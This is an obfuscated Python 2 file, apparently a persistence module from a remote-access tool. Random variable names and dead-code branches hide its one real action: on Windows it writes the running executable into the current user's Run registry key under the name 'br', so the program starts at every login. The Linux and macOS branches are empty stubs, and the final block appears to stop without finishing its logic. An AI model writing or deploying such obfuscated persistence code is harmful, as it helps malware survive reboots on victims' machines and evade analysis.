# -*- coding: utf-8 -*-
import sys
ySIZjFNMaFWySpBlOuaPgKQCPXgnEiLD = 'SFeKJAxNlEuZOjtbXbdCAlJisnlKOHqh'
KJaYNbraDgNwvyynumixdpLaNDYvOGcg = 'AeSUHrlJkRzUwafkZsFXLQhlXJHdDtMD'
UDmTHKLolJxIFqiedAbEbkYnhpkQNqsD = 'glJIuiTROcyxwdJTtqHKFJKAhlGWgEKe'
sKRLUKyrznSiPZUmpFHpAJHEZrXDSgLF = 'lEBBJvDRGdGclMrtkMvmeNwdaKjCoObP'
OhuJPfaLczEGgLACFWitbgVtqsuWBdIU = 'YndrWpyaldnpBUujKDrhEKOmfvCjXqJR'
IgeUoqAHpMtVkTzCtkdlGaVXGgWwsrrP = 'oSnlqgoKhlNKKkmCnnwPiIDSolToJICu'
if UDmTHKLolJxIFqiedAbEbkYnhpkQNqsD == sKRLUKyrznSiPZUmpFHpAJHEZrXDSgLF:
    for IgeUoqAHpMtVkTzCtkdlGaVXGgWwsrrP in OhuJPfaLczEGgLACFWitbgVtqsuWBdIU:
        if IgeUoqAHpMtVkTzCtkdlGaVXGgWwsrrP == sKRLUKyrznSiPZUmpFHpAJHEZrXDSgLF:
            OhuJPfaLczEGgLACFWitbgVtqsuWBdIU = ySIZjFNMaFWySpBlOuaPgKQCPXgnEiLD
        else:
            sKRLUKyrznSiPZUmpFHpAJHEZrXDSgLF = KJaYNbraDgNwvyynumixdpLaNDYvOGcg
def twTwJRgpCtiYysAJTpSWVactQnmXIUoC():
    YmCkxsfXxLvGRGYoprKYlRyzRgOdGhCo = 'UceCMHuhRNSANqgcShSLyszUxzcNKhWB'
    HkCwkqxBJCoroSdHpBRtLzEhPKUBKQwl = 'UNNhHjBZLcxHlgNmXrRjUjkzayLUMCkn'
    SNMBUDxyBERWZTXwsAbscdcwMqQhTtdS = 'MOmaLzualMgjijcdCmdtUjiWZWjkoraV'
    if YmCkxsfXxLvGRGYoprKYlRyzRgOdGhCo == HkCwkqxBJCoroSdHpBRtLzEhPKUBKQwl:
        AXFuqUYwFXfJxeaVjZBRhkveZDQGUoae = 'rdaiyLcKmYtYgOLJpwCoeSoGsUpdxENz'
        AXFuqUYwFXfJxeaVjZBRhkveZDQGUoae = YmCkxsfXxLvGRGYoprKYlRyzRgOdGhCo
    else:
        AXFuqUYwFXfJxeaVjZBRhkveZDQGUoae = 'rdaiyLcKmYtYgOLJpwCoeSoGsUpdxENz'
        AXFuqUYwFXfJxeaVjZBRhkveZDQGUoae = SNMBUDxyBERWZTXwsAbscdcwMqQhTtdS
    import _winreg
    DHyTZGXPbkyfOUuqCteCERMariKrAjMu = 'EOdYkptCNReIYbgFgJafuMuqiegYufez'
    UJTKdCiJaLGcMEabrLisqrMFaeLxLdFU = 'tgtGcLngBBMisUVGOFVHfyfcWXIvFqek'
    if DHyTZGXPbkyfOUuqCteCERMariKrAjMu != UJTKdCiJaLGcMEabrLisqrMFaeLxLdFU:
        LKDLPqvDIVOzvYHvrqJoQejAsWqqJFDD = 'EwQDsrvozQXENeqMUsMIpvYqVrKvGStg'
        tSRbsdRPhSwAcfEiqPHQESDdWkVWycho = 'xIkkCXkHpISLnGKJyJwtfbfcqeETKcaD'
        tSRbsdRPhSwAcfEiqPHQESDdWkVWycho = LKDLPqvDIVOzvYHvrqJoQejAsWqqJFDD
    from _winreg import HKEY_CURRENT_USER as HKCU
    tXLxbgQOlzOWwqNmiNyDUUIqKMzDJRds = 'ISNJEDiaOEarLTJyqCKQtCtXPzBvTxzJ'
    uvIaYakjwKthxMlhqNRRCKKhYdBmwyPb = 'AZkRYHfyciJJHGzYGlUnDsVHjYyZXkgL'
    if tXLxbgQOlzOWwqNmiNyDUUIqKMzDJRds != uvIaYakjwKthxMlhqNRRCKKhYdBmwyPb:
        kKOzBpKBAjGIHvFSnqzWltDwsHQpeWKe = 'fdRTmpqjhoTuVdaJqqDqbobsosLMyCZT'
        gVJwIDidPsvkTjrnyTUQoqxxWSaglNAd = 'TOhLEpABeAToItUvxBnXEysmtJLEaLGP'
        gVJwIDidPsvkTjrnyTUQoqxxWSaglNAd = kKOzBpKBAjGIHvFSnqzWltDwsHQpeWKe
    OoUwruuOCxsvbzRLhlfeVQcPCcefDUct = r'Software\Microsoft\Windows\CurrentVersion\Run'
    DdCRWAgcZEFznYMULahaoCRAGAZhytWl = 'ZMNVNynufTHxheRlhooBqxsfcfYVnuln'
    ZXAmGNrmhosfjkYscOAGAMmAgjFAcoXn = 'nagggnYBeJGPycAlhYTDoujWGjQxicKR'
    if DdCRWAgcZEFznYMULahaoCRAGAZhytWl != ZXAmGNrmhosfjkYscOAGAMmAgjFAcoXn:
        hJnlSYrCtrNeWzLcQFeARcKhYoNIDuOz = 'jGfVBZBpULvnwfchAAqdqFxjomZNQaPV'
        bNhgncdOKIszQBrKLRfbIBlbaDQCziER = 'bApUqlRLNPWZywHWEqPIUsYHeDOuFgoc'
        bNhgncdOKIszQBrKLRfbIBlbaDQCziER = hJnlSYrCtrNeWzLcQFeARcKhYoNIDuOz
    ufblGYAiXWcAjXbMHaocjRXiiseJacjV = sys.executable
    aJmwBpuZmUTiJVrIlYlnMMGTBhJErQTY = 'EomrjoNXNQtzHjVePdPfWrrGnSCOgdfo'
    vvroZBwdiudldOqWUYUftoBrQLcXyCWw = 'RvcnlPzmREMqRTdzqsXaJtPkhugGeSXz'
    if aJmwBpuZmUTiJVrIlYlnMMGTBhJErQTY != vvroZBwdiudldOqWUYUftoBrQLcXyCWw:
        bakarAjVGIVqawhCjqxLLUaeDPTCeFRj = 'eCEskSWJQjGYefaZYLuswQfNJpvcXVue'
        HELwmuWvdFCjkpdAOaazOUOQILWtwUBp = 'HdBinBIFPMOYghgFAJynaqnhNfoVAmtK'
        HELwmuWvdFCjkpdAOaazOUOQILWtwUBp = bakarAjVGIVqawhCjqxLLUaeDPTCeFRj
    try:
        wdcIyMIgMIPZNlHQBqHQObWnKNUwuKMU = 'kVmeOtIXCUzuQbojeeLWEuGgjcmRtVVX'
        OwdYMMCBogxbccrHguFCOxUDfxrukjJZ = 'jtazFmNGjCrBuUXcqtEiQcPnkTsjonkv'
        bBqWanwPtIChbBCASSmiZtctxUPvgEZT = 'nFRRHohtARAmIJDGMIWEaCBeJvkmxpIU'
        if wdcIyMIgMIPZNlHQBqHQObWnKNUwuKMU == OwdYMMCBogxbccrHguFCOxUDfxrukjJZ:
            BGYXKDbnPGUrIuDQDSnHRHqDrguRjMFI = 'wGrLjPHoEiFlBmiWAkLnVmYFXvSntdxJ'
            BGYXKDbnPGUrIuDQDSnHRHqDrguRjMFI = wdcIyMIgMIPZNlHQBqHQObWnKNUwuKMU
        else:
            BGYXKDbnPGUrIuDQDSnHRHqDrguRjMFI = 'wGrLjPHoEiFlBmiWAkLnVmYFXvSntdxJ'
            BGYXKDbnPGUrIuDQDSnHRHqDrguRjMFI = bBqWanwPtIChbBCASSmiZtctxUPvgEZT
        CnLAOJtwNkaJsBDeLGzogEwVPsXLPHRE = _winreg.OpenKey(HKCU, OoUwruuOCxsvbzRLhlfeVQcPCcefDUct, 0, _winreg.KEY_WRITE)
        DpcwrsQOZpiMEumBGnbdepltGVPDjHLO = 'iwADpsJSGcXtjZNalNAZxOYDXatbbyap'
        vNsipwtiLOnpXHAXqmkZmccVKvBUshvt = 'kPMloxQIfXTqCPXkkunLyBNDbyUgvjAP'
        UlCZEkqOgoyQeYetZxKFhqHCsxGmYZJb = 'XKGycqKOdTPgdUpHieBlmfbsocMvMIBe'
        wwfkjcBFAvzuKkXxbaWFeoDCfhNaOWNx = 'JtfFLwRqHelitvNNXDFKkWvaeXjsiDGc'
        PDHqwNsoZoVZrXrUsVxhgVVqsHeFyFWv = 'NnNalvsrAIisytpsADmNgUpeJuNWCHhO'
        wlEWTYGvuCCiasompzDzEVhgzADCJKFe = 'tRIgkSGXZRbSzUOHeiHtbnegcJQWUpKo'
        if DpcwrsQOZpiMEumBGnbdepltGVPDjHLO != wwfkjcBFAvzuKkXxbaWFeoDCfhNaOWNx:
            vNsipwtiLOnpXHAXqmkZmccVKvBUshvt = UlCZEkqOgoyQeYetZxKFhqHCsxGmYZJb
            for wlEWTYGvuCCiasompzDzEVhgzADCJKFe in wwfkjcBFAvzuKkXxbaWFeoDCfhNaOWNx:
                if wlEWTYGvuCCiasompzDzEVhgzADCJKFe != UlCZEkqOgoyQeYetZxKFhqHCsxGmYZJb:
                    vNsipwtiLOnpXHAXqmkZmccVKvBUshvt = vNsipwtiLOnpXHAXqmkZmccVKvBUshvt
                else:
                    PDHqwNsoZoVZrXrUsVxhgVVqsHeFyFWv = DpcwrsQOZpiMEumBGnbdepltGVPDjHLO
        else:
            UlCZEkqOgoyQeYetZxKFhqHCsxGmYZJb = DpcwrsQOZpiMEumBGnbdepltGVPDjHLO
            DpcwrsQOZpiMEumBGnbdepltGVPDjHLO = PDHqwNsoZoVZrXrUsVxhgVVqsHeFyFWv
            if UlCZEkqOgoyQeYetZxKFhqHCsxGmYZJb == DpcwrsQOZpiMEumBGnbdepltGVPDjHLO:
                for wlEWTYGvuCCiasompzDzEVhgzADCJKFe in DpcwrsQOZpiMEumBGnbdepltGVPDjHLO:
                    if wlEWTYGvuCCiasompzDzEVhgzADCJKFe == UlCZEkqOgoyQeYetZxKFhqHCsxGmYZJb:
                        UlCZEkqOgoyQeYetZxKFhqHCsxGmYZJb = DpcwrsQOZpiMEumBGnbdepltGVPDjHLO
                    else:
                        UlCZEkqOgoyQeYetZxKFhqHCsxGmYZJb = PDHqwNsoZoVZrXrUsVxhgVVqsHeFyFWv
        _winreg.SetValueEx(CnLAOJtwNkaJsBDeLGzogEwVPsXLPHRE, 'br', 0, _winreg.REG_SZ, ufblGYAiXWcAjXbMHaocjRXiiseJacjV)
        JicYWUiKvMlUZDuTIQHLHXQbNAYEqJCz = 'rLXydBwmhgmeIPFhWXdfAgLqPqwTMkQO'
        GlGAfmkcOlOepMvuWPCOHRYZBglSSXYh = 'GAqcIswoGlEmHjmSmrQXAUhVFSyDnNGG'
        XUTgxHclQeHJMVozTHEbrJJksxYjBhac = 'CRuWJHNAxqRhhiYSqSRYEgTgplOWIOTu'
        nnIbUSWYGQwwZsOLlEyClSPbDNfALCcv = 'KxcHIGvLQKTJJQjiHgbTMKmdIHMsAcdr'
        atzvWQxPPTcagFBCPhGBNFnwgsrNAwyq = 'QVIIbuPMHbkmlaxTteXVNdntBnRIpEMG'
        PsGLuFcQwefvsFIaDBUWRKWPAxRiuodi = 'YeQaMDbzfLmbIOGKxXvKSgYUNDLstjzr'
        if JicYWUiKvMlUZDuTIQHLHXQbNAYEqJCz != nnIbUSWYGQwwZsOLlEyClSPbDNfALCcv:
            GlGAfmkcOlOepMvuWPCOHRYZBglSSXYh = XUTgxHclQeHJMVozTHEbrJJksxYjBhac
            for PsGLuFcQwefvsFIaDBUWRKWPAxRiuodi in nnIbUSWYGQwwZsOLlEyClSPbDNfALCcv:
                if PsGLuFcQwefvsFIaDBUWRKWPAxRiuodi != XUTgxHclQeHJMVozTHEbrJJksxYjBhac:
                    GlGAfmkcOlOepMvuWPCOHRYZBglSSXYh = GlGAfmkcOlOepMvuWPCOHRYZBglSSXYh
                else:
                    atzvWQxPPTcagFBCPhGBNFnwgsrNAwyq = JicYWUiKvMlUZDuTIQHLHXQbNAYEqJCz
        else:
            XUTgxHclQeHJMVozTHEbrJJksxYjBhac = JicYWUiKvMlUZDuTIQHLHXQbNAYEqJCz
            JicYWUiKvMlUZDuTIQHLHXQbNAYEqJCz = atzvWQxPPTcagFBCPhGBNFnwgsrNAwyq
            if XUTgxHclQeHJMVozTHEbrJJksxYjBhac == JicYWUiKvMlUZDuTIQHLHXQbNAYEqJCz:
                for PsGLuFcQwefvsFIaDBUWRKWPAxRiuodi in JicYWUiKvMlUZDuTIQHLHXQbNAYEqJCz:
                    if PsGLuFcQwefvsFIaDBUWRKWPAxRiuodi == XUTgxHclQeHJMVozTHEbrJJksxYjBhac:
                        XUTgxHclQeHJMVozTHEbrJJksxYjBhac = JicYWUiKvMlUZDuTIQHLHXQbNAYEqJCz
                    else:
                        XUTgxHclQeHJMVozTHEbrJJksxYjBhac = atzvWQxPPTcagFBCPhGBNFnwgsrNAwyq
        _winreg.CloseKey(CnLAOJtwNkaJsBDeLGzogEwVPsXLPHRE)
        QljPkzTvtlSelesuYlTPjoxlzOKKnEdr = 'YcSCTTeIpMNVemhkmbODOyJKRtowGnJP'
        zwELSlnUHLidQxgDyPQxEKQrabuVXrDc = 'lJTncHrIFXVlHnBMWtdqMFICDURqGhKZ'
        cfkmfoZLDQConpneBGGJqGQzHKpQSjda = 'flUqdgNEfHZNfVBqtoViSpWfJtsObNRo'
        gCvegqaCnCCuJGVSvhUoRbCnpOiOkFFt = 'WfnRlPDNssBjYfNSKDOqUkUsXlGSvcfs'
        HOMrAAuAPQlrrzlbnbKMiPgxEtfNbDiy = 'sJeKLXQhJVpWGjokCrwxCLRUqFjOpZzu'
        if QljPkzTvtlSelesuYlTPjoxlzOKKnEdr in zwELSlnUHLidQxgDyPQxEKQrabuVXrDc:
            QljPkzTvtlSelesuYlTPjoxlzOKKnEdr = HOMrAAuAPQlrrzlbnbKMiPgxEtfNbDiy
            if zwELSlnUHLidQxgDyPQxEKQrabuVXrDc in cfkmfoZLDQConpneBGGJqGQzHKpQSjda:
                zwELSlnUHLidQxgDyPQxEKQrabuVXrDc = gCvegqaCnCCuJGVSvhUoRbCnpOiOkFFt
        elif zwELSlnUHLidQxgDyPQxEKQrabuVXrDc in QljPkzTvtlSelesuYlTPjoxlzOKKnEdr:
            cfkmfoZLDQConpneBGGJqGQzHKpQSjda = zwELSlnUHLidQxgDyPQxEKQrabuVXrDc
            if cfkmfoZLDQConpneBGGJqGQzHKpQSjda in zwELSlnUHLidQxgDyPQxEKQrabuVXrDc:
                zwELSlnUHLidQxgDyPQxEKQrabuVXrDc = HOMrAAuAPQlrrzlbnbKMiPgxEtfNbDiy
        return True, 'HKCU Run registry key applied'
    except WindowsError:
        rmQkjUoosiZtmyhNWzhifkjAEGTnaoAm = 'wuRmJgyZigfmXmefpCRjXNDLwXXhZJNn'
        FSWvboyBpcgumadcLIHrWwGjApmDNmlj = 'GfGNtChHYQbNLFiDloiRgXNtorrmHwdd'
        zlxnpbyhaKKzlyHNgZtorbalIClqeXls = 'urCKGovyAdOePNUGNDgfbVnLfSTjOrNW'
        zVPaGXjIBJmaaSCPXrwoiYfSQjKGzsny = 'lFtPIKSSeIDdPABwgmcSkQYNaKVaNlqQ'
        YzQVSaLViSJvlfsEEtexoMBOEwSqMkUR = 'PGNpIqcVzKJeqIoPtVbkAToxmcrHJGld'
        XYVMwEpJLyWnPsvhqVCZkYcXMunBaCrb = 'gKHyljIbxVKauRYiGNfRySNWqmPoyRUY'
        if zlxnpbyhaKKzlyHNgZtorbalIClqeXls == zVPaGXjIBJmaaSCPXrwoiYfSQjKGzsny:
            for XYVMwEpJLyWnPsvhqVCZkYcXMunBaCrb in YzQVSaLViSJvlfsEEtexoMBOEwSqMkUR:
                if XYVMwEpJLyWnPsvhqVCZkYcXMunBaCrb == zVPaGXjIBJmaaSCPXrwoiYfSQjKGzsny:
                    YzQVSaLViSJvlfsEEtexoMBOEwSqMkUR = rmQkjUoosiZtmyhNWzhifkjAEGTnaoAm
                else:
                    zVPaGXjIBJmaaSCPXrwoiYfSQjKGzsny = FSWvboyBpcgumadcLIHrWwGjApmDNmlj
        return False, 'HKCU Run registry key failed'
def OJLtpAAQOxkOFbeWGuimqvyohfehtiRD():
    yGiqEkLRcTcfdgwFIQKBQpCkPzMYgXTv = 'pYZEsOraRDZGwTvRZPgSLoygItImOrCB'
    zrzyAJAHIeYxIUaSmjRbeQmQaeTWBgMZ = 'pKAUGXesjYPJNXPxTTdFcxFmdSuTWtQb'
    FKeGEVQyDLPVpNRZlalAyxIbozqnoOSg = 'pqhMoxVVIUJOGqiFTSmETRXtlraildlA'
    if yGiqEkLRcTcfdgwFIQKBQpCkPzMYgXTv == zrzyAJAHIeYxIUaSmjRbeQmQaeTWBgMZ:
        MGkWUtjjyZsDvHzdVkXJLFpEvGLVKXFn = 'onzGwhnfThoYEAvvwQMXKnCTwVMfPYtV'
        MGkWUtjjyZsDvHzdVkXJLFpEvGLVKXFn = yGiqEkLRcTcfdgwFIQKBQpCkPzMYgXTv
    else:
        MGkWUtjjyZsDvHzdVkXJLFpEvGLVKXFn = 'onzGwhnfThoYEAvvwQMXKnCTwVMfPYtV'
        MGkWUtjjyZsDvHzdVkXJLFpEvGLVKXFn = FKeGEVQyDLPVpNRZlalAyxIbozqnoOSg
    return False, 'nothing here yet'
def XxLUDdhELotvJNPaHKbcOlIiLwkJIfLZ():
    rtcPVPycLqdlSjzyEflYxymhZTpLjJcF = 'RDKgkINhUpsyHonGVLbBtnjUOkGvQFgj'
    vlhQaLKInsOyZoKMzkuHEWIkyeIEpSVf = 'BJsbBlTwkCusWxaidDJVxpwEnvtRvFOX'
    LopnncbfWXydyJBbKbOqxauLKdiApUEl = 'mxkXOkmTYkTqeNRFpgArYhLWScFhbrBY'
    if rtcPVPycLqdlSjzyEflYxymhZTpLjJcF == vlhQaLKInsOyZoKMzkuHEWIkyeIEpSVf:
        hUQvmEHVeMOturpWvjZRWvsrFNGyOkOj = 'HYAFQcSgahrfrvfXvfkZbcyKZAYophFx'
        hUQvmEHVeMOturpWvjZRWvsrFNGyOkOj = rtcPVPycLqdlSjzyEflYxymhZTpLjJcF
    else:
        hUQvmEHVeMOturpWvjZRWvsrFNGyOkOj = 'HYAFQcSgahrfrvfXvfkZbcyKZAYophFx'
        hUQvmEHVeMOturpWvjZRWvsrFNGyOkOj = LopnncbfWXydyJBbKbOqxauLKdiApUEl
    return False, 'nothing here yet'
def GkCWbCyyixKfAFbWumWRqkyYVixwmlnc(plat_type):
    dUnHfPXbRDbkuFnrbSvSleKIGIdzgmiQ = 'CsBpNAzjCgBuadqtIYKSNDdUJMAJvOZc'
    yHSUzrSDHHUPvdJCNrSSFcPYWsLBgalC = 'mhSOzLXEZNVcbrIzOqsXgyTlOXdnJsBw'
    if dUnHfPXbRDbkuFnrbSvSleKIGIdzgmiQ != yHSUzrSDHHUPvdJCNrSSFcPYWsLBgalC:
        HlvnWekLmqeHSfALFSuhRTAnzsNSHCZX = 'JjKyhmFXPRjsgEppscNhUsYFpYqgDLBI'
        veiZNqcyzRXlLlRqapTNdyyByXJagcre = 'HdfsZNaKjkTXooFKLEojFacbMAPKLgFH'
        veiZNqcyzRXlLlRqapTNdyyByXJagcre = HlvnWekLmqeHSfALFSuhRTAnzsNSHCZX
    if plat_type.startswith('win'):
        xvqeiwkYBWEDjMDvmwJJkxDnvAXtEGbW = 'HePsLRkuFzJhyEBESikycQhcLKSreEZJ'
        tzCinqYuOSvnPNKIrCqObCZRpOsrhOiD = 'vPPYFeGAKWLzQuPwWTEMtNyYPxfGxUQB'
        ujRonEKXgASokzKvQAfJMSvrgqFlZmhY = 'BLLQhNcQCBBekaVcDELTVJrbLijEuHuT'
        if xvqeiwkYBWEDjMDvmwJJkxDnvAXtEGbW == tzCinqYuOSvnPNKIrCqObCZRpOsrhOiD:
            tPyJsRXzQyZABmAdORUoaXNsBgIOUbZD = 'oKCfJymmwQghucCoHbkApaSOlzNFBHoQ'
            tPyJsRXzQyZABmAdORUoaXNsBgIOUbZD = xvqeiwkYBWEDjMDvmwJJkxDnvAXtEGbW
        else:
            tPyJsRXzQyZABmAdORUoaXNsBgIOUbZD = 'oKCfJymmwQghucCoHbkApaSOlzNFBHoQ'
            tPyJsRXzQyZABmAdORUoaXNsBgIOUbZD = ujRonEKXgASokzKvQAfJMSvrgqFlZmhY
        success, VxYScffcXbzwIViwIQoUaISRXuFonWpW = twTwJRgpCtiYysAJTpSWVactQnmXIUoC()
        OfWtgpZgORqsWvXworlDVxVETGtlMbmO = 'vjeeqftDTPvazOjlnwhUNeKPSTikmhQr'
        lqNKYDiKgWIIJzvNOfHBxedYZgLhKBKT = 'knzbKApJKEWSancAyMlJRXGGUyjZZsjc'
        if OfWtgpZgORqsWvXworlDVxVETGtlMbmO != lqNKYDiKgWIIJzvNOfHBxedYZgLhKBKT:
            fzkSMZnwFJyvlYvWaRfZaqjgQlLszCWi = 'LOFCMmsYPxDtXhVxJeleueazwzTkIBbw'
            uPYwBGLaqUDYnTYVInGKqLUyQgpWDzIK = 'MvHkWKleoTeJzbcJqPNEynHIpUhHnIkE'
            uPYwBGLaqUDYnTYVInGKqLUyQgpWDzIK = fzkSMZnwFJyvlYvWaRfZaqjgQlLszCWi
    elif plat_type.startswith('linux'):
        JlXuNVqbBxaevXvcZJHLElTONyvdxzEj = 'rCIFJFAmUAtyAbPvKPXgbzjAWvlYWIdl'
        NnbWLlFtsOHJkyVexzRdIgbdVdrugnEm = 'YwTHuNlucCOxOaMOQRgVqhbxnRJOwkuB'
        if JlXuNVqbBxaevXvcZJHLElTONyvdxzEj != NnbWLlFtsOHJkyVexzRdIgbdVdrugnEm:
            BueOIJTqNSfqlIcsEqIMtbilJKoVwLAA = 'ldhxwrgNxgAvwCEtumZVsYXVgfVrqBnN'
            RaGzLNMGFVvVhLtgOkwbKxDMoXEPJzgy = 'NhnAXGzWiEgzvvzowWeZjtDjCEcVlxWW'
            RaGzLNMGFVvVhLtgOkwbKxDMoXEPJzgy = BueOIJTqNSfqlIcsEqIMtbilJKoVwLAA
        success, VxYScffcXbzwIViwIQoUaISRXuFonWpW = OJLtpAAQOxkOFbeWGuimqvyohfehtiRD()
        oGiaKmAgkvpCRHQxKIuODRCmtzdJkhmM = 'MpYhhLvTJGdxgiHRuRrRRTAwziFDDRan'
        DfhzDVqCGrrOvFLJqmeFNcjpDoINWqzF = 'nSCkHAAEGKlCkLhUjkfBMWQJjHxtqMlf'
        rwTRwiwaSogQbsncsfFSbzHuXMXQLpjT = 'aKIgLZjvbcPdlccZlGgiWLLDNhuUToKr'
        dEEWZvkfKXCxXfRxMWhnVfOuoBPZHLsK = 'lWBkKRXQppWIPgZyUlmByiOLEqNRXKKV'
        oqAXgFIQpNzFUehdjVXBlmdYqGeUWrqz = 'WlgzfevkShBuVmUGjdEYhbYARWVWoFUZ'
        CXgwnEnVUgQtjrTlnVQyCddTmxykXzJX = 'lAUnhoKryLFHoPqNzeZbZxFEbVqmkRkF'
        if rwTRwiwaSogQbsncsfFSbzHuXMXQLpjT == dEEWZvkfKXCxXfRxMWhnVfOuoBPZHLsK:
            for CXgwnEnVUgQtjrTlnVQyCddTmxykXzJX in oqAXgFIQpNzFUehdjVXBlmdYqGeUWrqz:
                if CXgwnEnVUgQtjrTlnVQyCddTmxykXzJX == dEEWZvkfKXCxXfRxMWhnVfOuoBPZHLsK:
                    oqAXgFIQpNzFUehdjVXBlmdYqGeUWrqz = oGiaKmAgkvpCRHQxKIuODRCmtzdJkhmM
                else:
                    dEEWZvkfKXCxXfRxMWhnVfOuoBPZHLsK = DfhzDVqCGrrOvFLJqmeFNcjpDoINWqzF
    elif plat_type.startswith('darwin'):
        AzihSVhsQdQcLXytWUfbKEvJbxawmRJQ = 'yEbWpnRxmexzZmSzVaGVwvSdHLvLonmz'
        unEvxKzBBaAVWTSJheZtBpIPnqyJvkRP = 'uGCOWEsonPNBmnJlsXrdPDcfmuOjBgNH'
        qOtgMHOlpSeCAJiOewGskkCUCZzVYUwf = 'VkLbTsnOzNdlBApODEOmWoKrGuRdbqgO'
        LFtibwHLBwExylikNkEwqaKDJrQbEJlP = 'ZDWccvCaNdXMcDdqGTdBceYxXQZqNaKw'
        vXTSRDsVEQuYzMwvyCLiwnVbudCBDsii = 'fkNCdEiPTDWRIHMtNzpnWzDUxsrIgyNg'
        tKjJwPxYlkmsALOGRptqSBPBmuSlyecM = 'ldrmjzNlPabnTsIBtVjllAYbkvQqLyIR'
        if qOtgMHOlpSeCAJiOewGskkCUCZzVYUwf == LFtibwHLBwExylikNkEwqaKDJrQbEJlP:
            for tKjJwPxYlkmsALOGRptqSBPBmuSlyecM in vXTSRDsVEQuYzMwvyCLiwnVbudCBDsii:
                if tKjJwPxYlkmsALOGRptqSBPBmuSlyecM == LFtibwHLBwExylikNkEwqaKDJrQbEJlP:
                    vXTSRDsVEQuYzMwvyCLiwnVbudCBDsii = AzihSVhsQdQcLXytWUfbKEvJbxawmRJQ
                else:
                    LFtibwHLBwExylikNkEwqaKDJrQbEJlP = unEvxKzBBaAVWTSJheZtBpIPnqyJvkRP
        success, VxYScffcXbzwIViwIQoUaISRXuFonWpW = XxLUDdhELotvJNPaHKbcOlIiLwkJIfLZ()
        fcfhRKGojBZSVxgqZiSZuzUJeIfcNkcg = 'atNrBbbynqnkCFQWDzWVnXgxQgngmLKh'
        uTjGqZypbkhoMOzhFZSAuIfzxctzjoLK = 'flKrvKberuBcXzmIxrOnRxnggOOIFsbh'
        SpPTdNxrWGejhbyySJZWjMcXnlGPqTMA = 'HmvBvOrqEGdeVoyvVtwXomZUVykAzSeu'
        LexNBWfuTbcRdoTZksoQcNRHcdlZFoIt = 'SUMgUNoPzuyLSLSGvKPUrGYkBMliCReU'
        qhHnfsmIukpKsTsHIFmSUiEKsAmKEqPo = 'gWQauYPWryqrZyYasuCVFOsypdURjPWg'
        KGYLTTMoKPjUSarAwOsXcKYqAEeqPgvD = 'viLYxLSKbsnXAVkvCWkruksWkLmPVRUg'
        if fcfhRKGojBZSVxgqZiSZuzUJeIfcNkcg != LexNBWfuTbcRdoTZksoQcNRHcdlZFoIt:
            uTjGqZypbkhoMOzhFZSAuIfzxctzjoLK = SpPTdNxrWGejhbyySJZWjMcXnlGPqTMA
            for KGYLTTMoKPjUSarAwOsXcKYqAEeqPgvD in LexNBWfuTbcRdoTZksoQcNRHcdlZFoIt:
                if KGYLTTMoKPjUSarAwOsXcKYqAEeqPgvD != SpPTdNxrWGejhbyySJZWjMcXnlGPqTMA:
                    uTjGqZypbkhoMOzhFZSAuIfzxctzjoLK = uTjGqZypbkhoMOzhFZSAuIfzxctzjoLK
                else:
                    qhHnfsmIukpKsTsHIFmSUiEKsAmKEqPo = fcfhRKGojBZSVxgqZiSZuzUJeIfcNkcg
        else:
            SpPTdNxrWGejhbyySJZWjMcXnlGPqTMA = fcfhRKGojBZSVxgqZiSZuzUJeIfcNkcg
            fcfhRKGojBZSVxgqZiSZuzUJeIfcNkcg = qhHnfsmIukpKsTsHIFmSUiEKsAmKEqPo
            if SpPTdNxrWGejhbyySJZWjMcXnlGPqTMA == fcfhRKGojBZSVxgqZiSZuzUJeIfcNkcg:
                for KGYLTTMoKPjUSarAwOsXcKYqAEeqPgvD in fcfhRKGojBZSVxgqZiSZuzUJeIfcNkcg:
                    if KGYLTTMoKPjUSarAwOsXcKYqAEeqPgvD == SpPTdNxrWGejhbyySJZWjMcXnlGPqTMA:
                        SpPTdNxrWGejhbyySJZWjMcXnlGPqTMA = fcfhRKGojBZSVxgqZiSZuzUJeIfcNkcg
                    else:
                        SpPTdNxrWGejhbyySJZWjMcXnlGPqTMA = qhHnfsmIukpKsTsHIFmSUiEKsAmKEqPo
    else:
        nUCwPBisDmcThXrMstyOZZEtEJhnMtSw = 'bGXUvBNeCLbpWjSuAfBxGzZbeLRgxZdm'
        ECyaWJhvocjaLfexnaNkbLvfzdlWPgAu = 'ItxDxJywlPLwHuqDvmibUEOIQCzFQgQf'
        sIdZEAQJyxzOMCkeAEEmUBaWQSJzipzt = 'vqgVujaFpUBpGNrQNUOoVgsCCBIwAtgF'
        if nUCwPBisDmcThXrMstyOZZEtEJhnMtSw == ECyaWJhvocjaLfexnaNkbLvfzdlWPgAu:
            GBLqtuJkBQszNbVUiYjtjXRUBrZTwtIS = 'HtpTmqHfREFMeNxokJgIzfcaybJfBXst'
            GBLqtuJkBQszNbVUiYjtjXRUBrZTwtIS = nUCwPBisDmcThXrMstyOZZEtEJhnMtSw
        else:
            GBLqtuJkBQszNbVUiYjtjXRUBrZTwtIS = 'HtpTmqHfREFMeNxokJgIzfcaybJfBXst'
            GBLqtuJkBQszNbVUiYjtjXRUBrZTwtIS = sIdZEAQJyxzOMCkeAEEmUBaWQSJzipzt
        return 'Error, platform unsupported.'
    if success:
        fTAkfvFfXYCUnEIMWuutRNdNhLNQbeup = 'ZhGLGBZWJRsDivTNzXeIecTlqeYsLvXq'
        JnIqmhGmZskHtrfDCeNRnWFlfipFsvGS = 'cZbfjDZFQJqnhJksLLexxDEEDlsgHyow'
        AtRKNKDnXglSRjgdjjUjcdelTySiKOPC = 'VWRcOQUwzqwOsmJlHWkUHkqxJeaSyefy'
        CQHItjdtrltKroBlAGUnieCoOxVwysIe = 'OvsqrKnvnXvFAWutKXIDXWiERSlEtYME'
        FWWqwTBWyexZmPggizonkJWkOwwfVVHa = 'RYOVwAvrHBOrSIvKNCnvKDuYaxZDqvvm'
        GdmKfectPMpwwarCWYMccFlbcJaBLhKm = 'nzCTUvdicYGxmtyNGSeFOCoCfyeUtrMF'
        if AtRKNKDnXglSRjgdjjUjcdelTySiKOPC == CQHItjdtrltKroBlAGUnieCoOxVwysIe:
            for GdmKfectPMpwwarCWYMccFlbcJaBLhKm in FWWqwTBWyexZmPggizonkJWkOwwfVVHa:
                if GdmKfectPMpwwarCWYMccFlbcJaBLhKm == CQHItjdtrltKroBlAGUnieCoOxVwysIe:
                    FWWqwTBWyexZmPggizonkJWkOwwfVVHa = fTAkfvFfXYCUnEIMWuutRNdNhLNQbeup
                else:
                    CQHItjdtrltKroBlAGUnieCoOxVwysIe = JnIqmhGmZskHtrfDCeNRnWFlfipFsvGS
